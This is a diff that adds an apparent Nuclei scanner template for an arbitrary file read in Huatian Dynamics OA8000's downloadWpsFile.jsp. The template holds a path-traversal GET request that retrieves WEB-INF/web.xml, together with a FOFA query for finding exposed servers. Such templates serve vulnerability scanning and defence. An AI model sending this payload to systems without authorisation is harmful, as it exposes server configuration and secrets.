@@ -1,0 +1,33 @@
+id: huatianOA-downloadWpsFile-File-reading
+
+info:
+  name: 华天动力OA downloadWpsFile.jsp 任意文件读取
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: app="华天动力-OA8000"
+
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        GET /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version="1.0"'
+          - 'Licensed to the Apache'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
